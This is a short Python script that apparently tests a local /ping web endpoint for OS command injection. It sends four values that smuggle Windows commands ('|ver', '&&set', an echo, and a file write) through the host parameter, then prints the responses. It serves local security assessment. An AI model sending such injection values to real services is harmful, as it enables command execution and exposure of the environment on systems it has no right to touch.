"""精确发送注入 payload，排除 curl/终端编码干扰。仅用于本地安全评估。"""
import http.client
import sys
import urllib.parse

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8088

payloads = [
    ("pipe-ver", "x|ver"),
    ("andand-set", "x&&set"),
    ("and-echo", "x & echo PWNED_8842"),
    ("write-file", "x & echo PWNFILE_8842 > pwn_8842.txt"),
]

for label, host in payloads:
    url = "/ping?host=" + urllib.parse.quote(host, safe="")
    conn = http.client.HTTPConnection("127.0.0.1", PORT, timeout=15)
    conn.request("GET", url)
    resp = conn.getresponse()
    body = resp.read().decode("gbk", errors="replace")
    conn.close()
    print("=== %s  host=%r  status=%d ===" % (label, host, resp.status))
    print(body[:400])
    print()
